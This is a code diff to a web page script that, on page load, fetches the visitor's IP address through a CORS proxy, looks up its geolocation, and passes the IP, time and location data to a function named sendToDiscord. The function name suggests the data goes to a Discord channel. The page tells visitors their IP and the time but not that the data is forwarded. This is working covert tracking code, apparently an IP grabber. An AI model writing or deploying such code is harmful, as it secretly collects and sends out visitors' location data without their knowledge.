@@ -1,13 +1,18 @@
 document.addEventListener('DOMContentLoaded', () => {
-  fetch('https://ipapi.co/json/')
+  fetch('https://cors-anywhere.herokuapp.com/https://ipapi.co/json/')
     .then(response => response.json())
-    .then(geoData => {
-      const ipAddress = geoData.ip;
+    .then(data => {
+      const ipAddress = data.ip;
       const currentDateTime = new Date();
       const dateTimeString = currentDateTime.toLocaleString();
 
-      const message = createMessage(ipAddress, dateTimeString, geoData);
-      sendToDiscord(message);
+      fetch(`https://json.geoiplookup.io/${ipAddress}`)
+        .then(response => response.json())
+        .then(geoData => {
+          const message = createMessage(ipAddress, dateTimeString, geoData);
+          sendToDiscord(message);
+        })
+        .catch(error => console.error(error));
 
       document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
       document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
